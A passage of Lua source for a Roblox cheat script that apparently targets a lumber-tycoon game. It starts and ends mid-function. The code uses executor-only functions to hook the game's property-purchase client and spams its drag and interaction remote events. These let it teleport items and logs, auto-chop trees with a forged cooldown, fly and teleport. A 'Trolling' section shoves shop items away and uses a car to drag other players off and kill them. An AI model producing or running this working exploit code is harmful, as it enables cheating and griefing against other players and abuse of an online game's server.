                  bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
                  lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r}
              elseif (ctrl.l + ctrl.r) == 0 and (ctrl.f + ctrl.b) == 0 and speed ~= 0 then
                  bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*0.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
              else
                  bv.velocity = Vector3.new(0,0,0)
              end
              bg.cframe = game.Workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((ctrl.f+ctrl.b)*speed/maxspeed),0,0)
          until not flying
          ctrl = {f = 0, b = 0, l = 0, r = 0}
          lastctrl = {f = 0, b = 0, l = 0, r = 0}
          speed = 0
          bg:Destroy()
          bv:Destroy()
          plr.Character.Humanoid.PlatformStand = false
      end
      mouse.KeyDown:connect(function(key)
          if key:lower() == Flyingkey and FlyingEnabled == true then
              if flying then flying = false
              else
                  flying = true
                  Fly()
              end
          elseif key:lower() == "w" then
              ctrl.f = 1
          elseif key:lower() == "s" then
              ctrl.b = -1
          elseif key:lower() == "a" then
              ctrl.l = -1
          elseif key:lower() == "d" then
              ctrl.r = 1
          end
      end)
      mouse.KeyUp:connect(function(key)
          if key:lower() == "w" then
              ctrl.f = 0
          elseif key:lower() == "s" then
              ctrl.b = 0
          elseif key:lower() == "a" then
              ctrl.l = 0
          elseif key:lower() == "d" then
              ctrl.r = 0
          end
      end)
      Fly()
  end
  game.Players.LocalPlayer.CharacterAdded:Connect(BetterFly)
  BetterFly()



  function AntiAFK(Val)
      if not Val then AFKVal:Disconnect() return end
      AFKVal = game:GetService("Players").LocalPlayer.Idled:connect(function()
          game:GetService("VirtualInputManager"):SendKeyEvent(true, "W", false, game)
          wait()
          game:GetService("VirtualInputManager"):SendKeyEvent(false, "W", false, game)
      end)
  end

  function Light(Val)
      if Val == false then game.Players.LocalPlayer.Character.Head.PointLight:Destroy() return end
      local PL = Instance.new("PointLight",game.Players.LocalPlayer.Character:FindFirstChild("Head"))
      PL.Range = 100
      PL.Brightness = 1
      PL.Shadows = false
  end

  function BTools()
      local Pllayyrs = game:GetService("Players").LocalPlayer
      local deletetool = Instance.new("Tool", Pllayyrs.Backpack)
      local undotool = Instance.new("Tool", Pllayyrs.Backpack)

      if editedparts == nil then
          editedparts = {}
          parentfix = {}
          positionfix = {}
      end


      deletetool.Name = "Delete"
      undotool.Name = "Undo"
      undotool.CanBeDropped = true
      deletetool.CanBeDropped = true
      undotool.RequiresHandle = false
      deletetool.RequiresHandle = false


      deletetool.Activated:Connect(function()

              table.insert(editedparts, mouse.Target)
              table.insert(parentfix, mouse.Target.Parent)
              table.insert(positionfix, mouse.Target.CFrame)
              mouse.Target.Parent = nil
      end)
      undotool.Activated:Connect(function()

              editedparts[#editedparts].Parent = parentfix[#parentfix]
              editedparts[#editedparts].CFrame = positionfix[#positionfix]
              table.remove(positionfix, #positionfix)
              table.remove(editedparts, #editedparts)
              table.remove(parentfix, #parentfix)
      end)
  end
  --#endregion


    --#region Player Teleport
  local AllPlayers = {"Select Player"}
  for i,v in next,game.Players:GetPlayers() do
      if not table.find(AllPlayers,v.Name) then
          table.insert(AllPlayers,v.Name)
      end
  end

  function TeleportToBase(Plr)
      for i,v in next, game:GetService("Workspace").Properties:GetChildren() do
          if v:FindFirstChild("Owner") and tostring(v.Owner.Value) == Plr then
              game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.OriginSquare.CFrame + Vector3.new(0,2,0)
              break
          end
      end
  end

  local function carTP(CFRAME) -- need to be in car
      player = game.Players.LocalPlayer
      humanoid = player.Character.Humanoid
      if humanoid.Seated then
          local CurrentSeat = player.Character.Humanoid.SeatPart
          if CurrentSeat and CurrentSeat.Parent.Type.Value == "Vehicle" then
              CurrentSeat.CFrame = CFRAME
              CurrentSeat.Parent.RightSteer.Wheel.CFrame = CFRAME
              CurrentSeat.Parent.LeftSteer.Wheel.CFrame = CFRAME
              CurrentSeat.Parent.RightPower.Wheel.CFrame = CFRAME
              CurrentSeat.Parent.LeftPower.Wheel.CFrame = CFRAME
          end

      end
  end


  function TeleportToPlayer(Plr)
      for i,v in next, game.Players:GetPlayers() do
          if tostring(v.Name) == Plr then
              game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(v.Character.HumanoidRootPart.CFrame.p)
              --print("Teleported")
              break
          end
      end
  end
  --#endregion


  --#region lasso

  local function isValidModel(v)
    local modelName = v.Name:lower()
	return v:FindFirstChild("Main") and not (string.find(modelName, "saw") or string.find(modelName, "utility") or string.find(modelName, "trailer") or string.find(modelName, "pickup") or string.find(modelName, "PropertySoldSign"))
  end

  local ScreenGui = Instance.new("ScreenGui")
  local Frame = Instance.new("Frame")

  ScreenGui.Parent = game.CoreGui
  ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

  Frame.Parent = ScreenGui
  Frame.BackgroundColor3 = Color3.new(0.098, 0.459, 1)
  Frame.BackgroundTransparency = 0.8
  Frame.BorderColor3 = Color3.new(0.09, 0.137, 0.776)
  Frame.BorderSizePixel = 2
  Frame.Position = UDim2.new(0, 0, 0, 0)
  Frame.Size = UDim2.new(0, 0, 0, 0)

  local Run = game:GetService("RunService")
  local Player = game.Players.LocalPlayer
  local UserInputService = game:GetService("UserInputService")
  local Camera = game.Workspace.CurrentCamera


  local Selected = {}

  local RunConnection = UserInputService.InputBegan:Connect(function(input)
      if not getgenv().isonlooze then
          return
      end

      if input.UserInputType == Enum.UserInputType.MouseButton1 then
          Frame.Visible = true
          Frame.Position = UDim2.new(0, Mouse.X, 0, Mouse.Y)
          while UserInputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton1) do
              Run.RenderStepped:Wait()

              Frame.Size = UDim2.new(0, Mouse.X, 0, Mouse.Y) - Frame.Position

              for _, v in pairs(game.Workspace.PlayerModels:GetChildren()) do
                  if isValidModel(v) then
                      local ScreenPos, Visible = Camera:WorldToScreenPoint(v.Main.CFrame.p)
                      if Visible then
                          if is_in_frame(ScreenPos, Frame) then
                              if v.Main:FindFirstChild("Selection") then
                                  continue
                              end

                              local SelectionBox = Instance.new("SelectionBox", v.Main)
                              SelectionBox.Name = "Selection"
                              SelectionBox.Adornee = SelectionBox.Parent
                              SelectionBox.SurfaceTransparency = 0.5
                              SelectionBox.LineThickness = 0.09
                              SelectionBox.SurfaceColor3 = Color3.fromRGB(0, 0, 0)
                              SelectionBox.Color3 = Color3.fromRGB(0, 172, 240)
                          end
                      end
                  end

                  if v:FindFirstChild("WoodSection") then
                      local ScreenPos, Visible = Camera:WorldToScreenPoint(v.WoodSection.CFrame.p)
                      if Visible then
                          if is_in_frame(ScreenPos, Frame) then
                              if v.WoodSection:FindFirstChild("Selection") then
                                  continue
                              end

                              local SelectionBox = Instance.new("SelectionBox", v.WoodSection)
                              SelectionBox.Name = "Selection"
                              SelectionBox.Adornee = SelectionBox.Parent
                              SelectionBox.SurfaceTransparency = 0.5
                              SelectionBox.LineThickness = 0.09
                              SelectionBox.SurfaceColor3 = Color3.fromRGB(0, 0, 0)
                              SelectionBox.Color3 = Color3.fromRGB(0, 172, 240)
                          end
                      end
                  end

            if not getgenv().GetBPs then

                else

                  if v:FindFirstChild("BuildDependentWood") then
                    local ScreenPos, Visible = Camera:WorldToScreenPoint(v.BuildDependentWood.CFrame.p)
                    if Visible then
                        if is_in_frame(ScreenPos, Frame) then
                            if v.BuildDependentWood:FindFirstChild("Selection") then
                                continue
                            end

                            local SelectionBox = Instance.new("SelectionBox", v.BuildDependentWood)
                            SelectionBox.Name = "Selection"
                            SelectionBox.Adornee = SelectionBox.Parent
                            SelectionBox.SurfaceTransparency = 0.5
                            SelectionBox.LineThickness = 0.09
                            SelectionBox.SurfaceColor3 = Color3.fromRGB(0, 0, 0)
                            SelectionBox.Color3 = Color3.fromRGB(0, 172, 240)
                        end
                    end
                end

            end


              end
          end

          Frame.Size = UDim2.new(0, 1, 0, 1)
          Frame.Visible = false
      end
  end)


  function lassoTpcheck()
      function is_in_frame(screenpos, frame)
          local xPos = frame.AbsolutePosition.X
          local yPos = frame.AbsolutePosition.Y

          local xSize = frame.AbsoluteSize.X
          local ySize = frame.AbsoluteSize.Y

          local check1 = screenpos.X >= xPos and screenpos.X <= xPos + xSize
          local check2 = screenpos.X <= xPos and screenpos.X >= xPos + xSize

          local check3 = screenpos.Y >= yPos and screenpos.Y <= yPos + ySize
          local check4 = screenpos.Y <= yPos and screenpos.Y >= yPos + ySize

          local finale = (check1 and check3) or (check2 and check3) or (check1 and check4) or (check2 and check4)

          return finale
      end
  end

  --#endregion


   --#region Logs
  function BringAllLogs()
      OldPos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
      for i,v in next, game:GetService("Workspace").LogModels:GetChildren() do
          if v:FindFirstChild("Owner") and v.Owner.Value == game.Players.LocalPlayer then
              game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(v:FindFirstChild("WoodSection").CFrame.p)
              if not v.PrimaryPart then
                  v.PrimaryPart = v:FindFirstChild("WoodSection")
              end
              for i = 1,50 do
                  game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(v)
                  v:SetPrimaryPartCFrame(OldPos)
                  task.wait()
              end
          end
          task.wait()
      end
      game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = OldPos
  end


  function SellAllLogs()
      OldPos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
      for i,v in next, game:GetService("Workspace").LogModels:GetChildren() do
          if v:FindFirstChild("Owner") and v.Owner.Value == game.Players.LocalPlayer then
              game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(v:FindFirstChild("WoodSection").CFrame.p)
              task.wait(0.3)
              if not v.PrimaryPart then
                  v.PrimaryPart = v:FindFirstChild("WoodSection")
              end
              spawn(function()
                  for i = 1,50 do
                      game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(v)
                      v:SetPrimaryPartCFrame(CFrame.new(314, -0.5, 86.822))
                      task.wait()
                  end
              end)
          end
          task.wait()
      end
      task.wait()
      game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = OldPos
  end
  --#endregion


   --#region SlotV2

  --#region Fast load
  local plr = game:service'Players'.LocalPlayer


  local function getPlots()
      local Properties = {}
      for _, v in next, workspace.Properties:GetChildren() do
          local Owner = v:FindFirstChild("Owner")
          if Owner and Owner.Value == nil then
              table.insert(Properties, v)
          end
      end
      return Properties[#Properties]
  end



  local propClient = plr.PlayerGui.PropertyPurchasingGUI.PropertyPurchasingClient
  local propEnvironment = getsenv(propClient)
  local oldPurchase = propEnvironment.enterPurchaseMode
  getsenv(propClient).enterPurchaseMode = function(...)
      if not skipLoading then
          return oldPurchase(...)
      end
      setupvalue(propEnvironment.rotate, 3, 0)
      setupvalue(oldPurchase, 10, getPlots())
      return
  end



  function LoadSlot(slot)
      if not game:GetService("ReplicatedStorage").LoadSaveRequests.ClientMayLoad:InvokeServer(game:GetService("Players").LocalPlayer) then
          --print("Load Is On cooldown Please Wait")
          repeat task.wait() until  game:GetService("ReplicatedStorage").LoadSaveRequests.ClientMayLoad:InvokeServer(game:GetService("Players").LocalPlayer)
      end
      local skipLoading = skil.skipLoading
      game:GetService("ReplicatedStorage").LoadSaveRequests.RequestLoad:InvokeServer(slot,game.Players.LocalPlayer)
      if game:GetService("Players").LocalPlayer.CurrentSaveSlot.Value == slot then
          --print("Loaded Slot "..slot)
      end
  end
 --#endregion


  --#region Land art
 local LandArtClick

 local LandArtMove

 local LP = game:GetService"Players".LocalPlayer

 local Mouse = LP:GetMouse()


 function Create(ToMake, Parent, Props)
     Props = Props or {}

     local Created = Instance.new(ToMake, Parent)

     for i, v in next, Props do
         Created[i] = v
     end
     return Created
 end

 function GetPlot(Value)
     local Value = Value or LP

     for i, v in next, Workspace.Properties:GetChildren() do
         if v:FindFirstChild"Owner" and v.Owner.Value == Value then
             return v
         end
     end

     return false
 end

 function LandArt(Value)
     if Value then if game:GetService("Players").LocalPlayer.OwnsProperty.value ~= true then return notifications:message{Title = "Butter", Description = "You need land to use this!", Icon = 6023426926} end end

     if not Value then
         LandArtClick:Disconnect()
         LandArtMove:Disconnect()
         Workspace:FindFirstChild"PlotFolder":Destroy()
         return
     end

     local LandVecs = {Vector3.new(40, 0, 0), Vector3.new(-40, 0, 0), Vector3.new(0, 0, 40), Vector3.new(0, 0, -40), Vector3.new(40, 0, 40), Vector3.new(40, 0, -40), Vector3.new(-40, 0, 40), Vector3.new(-40, 0, -40), Vector3.new(80, 0, 0), Vector3.new(-80, 0, 0), Vector3.new(0, 0, 80), Vector3.new(0, 0, -80), Vector3.new(80, 0, 80), Vector3.new(80, 0, -80), Vector3.new(-80, 0, 80), Vector3.new(-80, 0, -80), Vector3.new(40, 0, 80), Vector3.new(-40, 0, 80),Vector3.new(80, 0, 40), Vector3.new(80, 0, -40), Vector3.new(-80, 0, 40), Vector3.new(-80, 0, -40), Vector3.new(40, 0, -80), Vector3.new(-40, 0, -80)}

     local Folder, Selection = Create("Folder", Workspace, {Name = "PlotFolder"}), Create("SelectionBox", Workspace:WaitForChild("PlotFolder", 1), {Name = "Selection"})

     for i, v in next, LandVecs do
         Create("Part", Folder, {Name = "LandPreview", Transparency = 0.5, CFrame =  CFrame.new(GetPlot().OriginSquare.Position + v), Size = GetPlot().OriginSquare.Size, Color = Color3.fromRGB(124, 92, 70), Material = Enum.Material.Concrete, Anchored = true, CanCollide = false})
     end

     LandArtMove = Mouse.Move:Connect(function()
         local Target = Mouse.Target

         if Target:IsA"Part" and Target.Name == "LandPreview" then
             Selection.Adornee = Target
         else
             Selection.Adornee = nil
         end
     end)

     LandArtClick = Mouse.Button1Down:Connect(function()
         local Target = Mouse.Target

         if Target:IsA"Part" and Target.Name == "LandPreview" then
             game.ReplicatedStorage.PropertyPurchasing.ClientExpandedProperty:FireServer(GetPlot(), CFrame.new(Target.CFrame.p))
             Target:Destroy()
         end
     end)
 end
 --#endregion

  --#endregion


   --#region Woodstuff + VehicleSpawner
  local AxeClassesFolder = game:GetService("ReplicatedStorage").AxeClasses

  function GetBestAxe(Tree)
      if game.Players.LocalPlayer.Character:FindFirstChild("Tool") then
          game.Players.LocalPlayer.Character.Humanoid:UnequipTools()
      end
      local SelectedTool = nil
      local HighestAxeDamage = 0
      for i,v in next, game.Players.LocalPlayer.Backpack:GetChildren() do
          if v.Name == "Tool" then
              if require(AxeClassesFolder:FindFirstChild("AxeClass_"..v.ToolName.Value)).new().Damage > HighestAxeDamage then
                  SelectedTool = v
                  if require(AxeClassesFolder:FindFirstChild("AxeClass_"..v.ToolName.Value)).new().SpecialTrees then
                      if require(AxeClassesFolder:FindFirstChild("AxeClass_"..v.ToolName.Value)).new().SpecialTrees[Tree] then
                          return v
                      end
                  end
              end
          end
      end
      return SelectedTool
  end



  function GetAxeDamage(Tree)
      if game.Players.LocalPlayer.Character:FindFirstChild("Tool") then
          game.Players.LocalPlayer.Character.Humanoid:UnequipTools()
      end
      if require(AxeClassesFolder:FindFirstChild("AxeClass_"..GetBestAxe(Tree).ToolName.Value)).new().SpecialTrees then
          if require(AxeClassesFolder:FindFirstChild("AxeClass_"..GetBestAxe(Tree).ToolName.Value)).new().SpecialTrees[Tree] then
              return require(AxeClassesFolder:FindFirstChild("AxeClass_"..GetBestAxe(Tree).ToolName.Value)).new().SpecialTrees[Tree].Damage
          end
      end
      return require(AxeClassesFolder:FindFirstChild("AxeClass_"..GetBestAxe(Tree).ToolName.Value)).new().Damage
  end

  function ChopTree(CutEventRemote, ID, Height,Tree)
      game:GetService("ReplicatedStorage").Interaction.RemoteProxy:FireServer(CutEventRemote, {["tool"] = GetBestAxe(Tree), ["faceVector"] = Vector3.new(1, 0, 0), ["height"] = Height, ["sectionId"] = ID, ["hitPoints"] = GetAxeDamage(Tree), ["cooldown"] = 0.25837870788574, ["cuttingClass"] = "Axe"})
  end

  function DicmemberTree()
      OldPos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
      local LogChopped = false
      branchadded = game:GetService("Workspace").LogModels.ChildAdded:Connect(function(v)
          if v:WaitForChild("Owner") and v.Owner.Value == game.Players.LocalPlayer then
              if v:WaitForChild("WoodSection") then
                  LogChopped = true
              end
          end
      end)

      DismemberTreeC = Mouse.Button1Up:Connect(function()
          Clicked = Mouse.Target
          if Clicked.Parent:FindFirstAncestor("LogModels") then
              if Clicked.Parent:FindFirstChild("Owner") and Clicked.Parent.Owner.Value == game.Players.LocalPlayer then
                  TreeToJointCut = Clicked.Parent
              end
          end
      end)
      repeat task.wait() until tostring(TreeToJointCut) ~= "nil"
      if TreeToJointCut:FindFirstChild("WoodClass") and TreeToJointCut.WoodClass.Value == "LoneCave" then
          if GetBestAxe("LoneCave").ToolName.Value ~= "EndTimesAxe" then
              return print("Error","You need an end times axe")
          end
      end
      for i,v in next, TreeToJointCut:GetChildren() do
          if v.Name == "WoodSection" then
              if v:FindFirstChild("ID") and v.ID.Value ~= 1 then
                  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(v.CFrame.p)
                  repeat
                      ChopTree(v.Parent:FindFirstChild("CutEvent"), v.ID.Value, 0, v.Parent:FindFirstChild("TreeClass").Value) -- 0.32 test
                      task.wait()
                  until LogChopped == true
                  LogChopped = false
                  task.wait(1)
              end
          end
      end
      TreeToJointCut = nil
      branchadded:Disconnect()
      DismemberTreeC:Disconnect()
      game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = OldPos
  end


  function VehicleSpawner(Color)
      notifications:message{
          Title = "Butter",
          Description = "Click a car spawn pad",
          Icon = 6023426926
      }
      if tostring(Color) == "Car Colors" then return end
      AbortVehicleSpawner = false
      RespawnedCar = game:GetService("Workspace").PlayerModels.ChildAdded:connect(function(v)
          if v:WaitForChild("Owner") and v.Owner.Value == game.Players.LocalPlayer then
              if v:WaitForChild("PaintParts") then
                  VehicleRespawnedColor = v.PaintParts:WaitForChild("Part")
              end
          end
      end)

      VehicleSpawnerVal = Mouse.Button1Up:Connect(function()
          if Mouse.Target.Parent:FindFirstChild("Owner") then
              if Mouse.Target.Parent.Owner.Value == game.Players.LocalPlayer then
                  if Mouse.Target.Parent.Type.Value == "Vehicle Spot" then
                      SelectedSpawnPad = Mouse.Target
                      repeat
                          if AbortVehicleSpawner then VehicleSpawnerVal:Disconnect() RespawnedCar:Disconnect() return end
                          game:GetService("ReplicatedStorage").Interaction.RemoteProxy:FireServer(SelectedSpawnPad.Parent.ButtonRemote_SpawnButton)
                          task.wait(1)
                      until VehicleRespawnedColor.BrickColor.Name == SelectedSpawnColor
                      GUI:Notification{
                          Title = "Vehicle Spawner",
                          Text = "Selected Car Spawned",
                          Duration = 4,
                          Callback = function() end
                      }
                      VehicleSpawnerVal:Disconnect()
                      RespawnedCar:Disconnect()
                  end
              end
          end
      end)
  end
  --#endregion


   --#region ViewEndTree
  function ViewEndTree(Val)
      for i,v in pairs(game.Workspace:GetChildren()) do
          if v.Name == "TreeRegion" then
              for i,v in pairs(v:GetChildren()) do
                  if v:FindFirstChild("Owner") and tostring(v.Owner.Value) == "nil" then
                      if v:FindFirstChild("TreeClass") and tostring(v.TreeClass.Value) == "LoneCave" then
                          if Val then
                              game.Workspace.Camera.CameraSubject = v:FindFirstChild("WoodSection")
                          else
                              game.Workspace.Camera.CameraSubject = game.Players.LocalPlayer.Character.Humanoid
                          end
                      end
                  end
              end
          end
      end
  end
  --#endregion


  --#region Trolling
  function ClearShopItems()
      for i,v in next, game:GetService("Workspace").Stores:GetChildren() do
          if v.Name == "ShopItems" then
              for i,v in next, v:GetChildren() do
                  if v:FindFirstChild("Owner") and v.Owner.Value == nil then
                      spawn(function()
                          for i = 1,10 do
                              game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(v)
                              v.Main.CFrame = v.Main.CFrame + Vector3.new(0,0,25)
                              task.wait()
                          end
                      end)
                  end
              end
          end
      end
  end


  function BringPlayer()
     if not game.Players.LocalPlayer.Character.Humanoid.SeatPart then return notifications:message{Title = "Butter",Description = "You need to sit in a car for this feature!",Icon = 6023426926} end

      local oldpos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
      repeat wait()
          game.Players.LocalPlayer.Character.Humanoid.SeatPart.Parent:SetPrimaryPartCFrame(game.Players[plrselected].Character.Head.CFrame,(game.Players.LocalPlayer.Character.HumanoidRootPart))
          game.Players.LocalPlayer.Character.Humanoid.SeatPart.Parent:SetPrimaryPartCFrame(game.Players.LocalPlayer.Character.Humanoid.SeatPart.CFrame * CFrame.Angles(math.rad(180),0,0))
      until game.Players[plrselected].Character.Humanoid.SeatPart
      game.Players.LocalPlayer.Character.Humanoid.SeatPart.Parent:SetPrimaryPartCFrame(oldpos,(game.Players.LocalPlayer.Character.HumanoidRootPart))
  end

  function KillPlayer()
     if not game.Players.LocalPlayer.Character.Humanoid.SeatPart then return notifications:message{Title = "Butter",Description = "You need to sit in a car for this feature!",Icon = 6023426926} end

      function teleport(pos)
          game.Players.LocalPlayer.Character.Humanoid.SeatPart.Parent:SetPrimaryPartCFrame(pos,(game.Players.LocalPlayer.Character.HumanoidRootPart))
      end
      repeat wait()
          game.Players.LocalPlayer.Character.Humanoid.SeatPart.Parent:SetPrimaryPartCFrame(game.Players[plrselected].Character.Head.CFrame,(game.Players.LocalPlayer.Character.HumanoidRootPart))
          game.Players.LocalPlayer.Character.Humanoid.SeatPart.Parent:SetPrimaryPartCFrame(game.Players.LocalPlayer.Character.Humanoid.SeatPart.CFrame * CFrame.Angles(math.rad(180),0,0))
      until game.Players[plrselected].Character.Humanoid.SeatPart
      teleport(CFrame.new(-1675.2, 261.303, 1284.2))
  end
  --#endregion


  --#region OneUnitCutter
  function PlrHasTool()
      if game.Players.LocalPlayer.Backpack:FindFirstChild("Tool") or game.Players.LocalPlayer.Character:FindFirstChild("Tool") then
          return true
      end
      return false
  end


  function OneUnitCutter(Val)
      if not Val then PlankReAdded:Disconnect() UnitCutterClick:Disconnect() return end
      PlankReAdded = game:GetService("Workspace").PlayerModels.ChildAdded:Connect(function(v)
          if v:WaitForChild("TreeClass") and v:WaitForChild("WoodSection") then
              SelTree = v
              task.wait()
          end
      end)

      UnitCutterClick = Mouse.Button1Up:Connect(function()
          Clicked = Mouse.Target
          if not PlrHasTool() then return end
          if Clicked.Name == "WoodSection" then
              SelTree = Clicked.Parent
              game.Players.LocalPlayer.Character:MoveTo(Clicked.Position + Vector3.new(0,3,-3))
              repeat
                  if UnitCutter == false then break end
                  ChopTree(SelTree.CutEvent,1,1,SelTree.TreeClass.Value)
                  if SelTree:FindFirstChild("WoodSection") then game.Players.LocalPlayer.Character:MoveTo(SelTree:FindFirstChild("WoodSection").Position + Vector3.new(0,3,-3)) end
                  task.wait()
              until SelTree.WoodSection.Size.X <= 1.88 and SelTree.WoodSection.Size.Y <= 1.88 and SelTree.WoodSection.Size.Z <= 1.88
          end
      end)
  end
  --#endregion


   --#region UI Glow
  local glow = Instance.new("ImageLabel")

  local UIGradient = Instance.new("UIGradient")

  function glowong()

      glow.Name = "glow"
      glow.Parent = game:GetService("CoreGui")["frosty is cute"].Main
      glow.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
      glow.BackgroundTransparency = 1.000
      glow.Position = UDim2.new(0, -15, 0, -15)
      glow.Size = UDim2.new(1, 30, 1, 30)
      glow.ZIndex = 0
      glow.Image = "rbxassetid://5028857084"
      glow.ScaleType = Enum.ScaleType.Slice
      glow.SliceCenter = Rect.new(24, 24, 276, 276)



      UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 0, 4)), ColorSequenceKeypoint.new(0.10, Color3.fromRGB(255, 0, 153)), ColorSequenceKeypoint.new(0.20, Color3.fromRGB(204, 0, 255)), ColorSequenceKeypoint.new(0.30, Color3.fromRGB(51, 0, 255)), ColorSequenceKeypoint.new(0.40, Color3.fromRGB(0, 106, 255)), ColorSequenceKeypoint.new(0.50, Color3.fromRGB(0, 255, 255)), ColorSequenceKeypoint.new(0.60, Color3.fromRGB(0, 255, 102)), ColorSequenceKeypoint.new(0.70, Color3.fromRGB(51, 255, 0)), ColorSequenceKeypoint.new(0.80, Color3.fromRGB(204, 255, 0)), ColorSequenceKeypoint.new(0.90, Color3.fromRGB(228, 137, 0)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 0, 0))}
      UIGradient.Rotation = 45
      UIGradient.Parent = glow
      task.spawn(function()
          while task.wait() do
              twes(UIGradient,{Rotation=UIGradient.Rotation+360},"Linear","In",6)
              wait(6)
          end


          game:GetService('TweenService'):Create(UIGradient,TweenInfo.new(tim,Enum.EasingStyle[style],Enum.EasingDirection[dir]),changes):Play()
      end)
  end

  --#endregion


   --#region Wood/Item Teleport
  function delallselections()
      for i,v in pairs(game.Workspace.PlayerModels:GetChildren()) do
          if v:FindFirstChild("Main") then
              if v.Main:FindFirstChild("Selection") then
                  v.Main.Selection:Destroy()
              end
          end
      end

      for i,v in pairs(game.Workspace.PlayerModels:GetChildren()) do
          if v:FindFirstChild("WoodSection") then
              if v.WoodSection:FindFirstChild("Selection") then
                  v.WoodSection.Selection:Destroy()
              end
          end
      end

      for i,v in pairs(game.Workspace.PlayerModels:GetChildren()) do
        if v:FindFirstChild("BuildDependentWood") then
            if v.BuildDependentWood:FindFirstChild("Selection") then
                v.BuildDependentWood.Selection:Destroy()
            end
        end
    end


  end




  function SelectionTp(tpitemspeed,direction,Cords)
     OldPosB = game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame
     if direction == "Sideways" then
         OldPos = CFrame.new(314.776245, -1.59285617, 87.8067551, 0.999702156, 0.000650099711, 0.0243966226, -8.99892871e-09, 0.999645174, -0.0266372953, -0.024405282, 0.0266293604, 0.999347389) * CFrame.Angles(math.rad(90), 0, 0) + Vector3.new(0, 1, 0),1000,game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame
     elseif direction == "Upwards" then
         OldPos = Cords.CFrame
     end
     camon()
     for i,v in next, game.Workspace.PlayerModels:GetDescendants() do
         if v:FindFirstChild("Selection") then

         --for i = 1, math.huge do
             --wait(tpitemspeed)
             --if (v.Position - OldPos.Position).Magnitude < 3 then
                 --break
             --end

             game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(v:FindFirstChild("Selection").Parent.CFrame.p) * CFrame.new(5,0,0) wait(tpitemspeed)

             pcall(function()

                 if not v.Parent.PrimaryPart then
                     v.Parent.PrimaryPart = v:FindFirstChild("Selection").Parent
                 end



                 while not isnetworkowner(v) do
                     game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(v.Parent)
                     task.wait()
                 end

                 game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(v.Parent)

                 v:PivotTo(OldPos)

             end)

             wait(tpitemspeed)
         end

         end
     camoff()
     delallselections()
     if getgenv().whendonetp then
         game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = OldPosB
     end
 end




  function ClickToTP()
      if ClickTp == false then ClickToSellMouseVal:Disconnect() return end
      ClickToSellMouseVal = Mouse.Button1Up:Connect(function()
          local target = Mouse.Target.Parent
          if target:FindFirstChild("Owner") and target:FindFirstChild("Main") then
              for i,v in pairs(game.Workspace.PlayerModels:GetChildren()) do
                  if Mouse.Target:FindFirstChild("Selection") then
                  else
                      local bob = Instance.new("SelectionBox", target.Main)
                      bob.Name = "Selection"
                      bob.Adornee = bob.Parent
                      --a.AlwaysOnTop = true
                      bob.SurfaceTransparency = 0.5
                      bob.LineThickness = 0.09
                      bob.SurfaceColor3 = Color3.fromRGB(0,0,0)
                      bob.Color3 = Color3.fromRGB(0,172,240)
                  end
              end
          elseif target:FindFirstChild("Owner") and target:FindFirstChild("WoodSection") then
              for i,v in pairs(game.Workspace.PlayerModels:GetChildren()) do
                  if Mouse.Target:FindFirstChild("Selection") then
                  else
                      local bob = Instance.new("SelectionBox", target.WoodSection)
                      bob.Name = "Selection"
                      bob.Adornee = bob.Parent
                      --a.AlwaysOnTop = true
                      bob.SurfaceTransparency = 0.5
                      bob.LineThickness = 0.09
                      bob.SurfaceColor3 = Color3.fromRGB(0,0,0)
                      bob.Color3 = Color3.fromRGB(0,172,240)
                  end
              end
          end
      end)
  end

  function selectionv2(PLY)
      OldPos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
      if getgenv().selectionv2 == false then Betterselection:Disconnect() return end
      Betterselection = Mouse.Button1Up:Connect(function()
          for i,v in pairs(game.Workspace.PlayerModels:GetChildren()) do
              --local target = Mouse.Target.Parent
              if v:FindFirstChild("Main") then
                  if v.Main.Parent.Name == Mouse.Target.Parent.Name then
                      if Mouse.Target.Parent:FindFirstChild("Owner") and tostring(v.Owner.Value) == PLY then
                          if v.Main:FindFirstChild("Selection") then
                          else
                              local bobv2 = Instance.new("SelectionBox", v.Main)
                              bobv2.Name = "Selection"
                              bobv2.Adornee = bobv2.Parent
                              bobv2.SurfaceTransparency = 0.5
                              bobv2.LineThickness = 0.09
                              bobv2.SurfaceColor3 = Color3.fromRGB(0,0,0)
                              bobv2.Color3 = Color3.fromRGB(0,172,240)
                          end
                      end
                  end
              elseif v:FindFirstChild("WoodSection") then
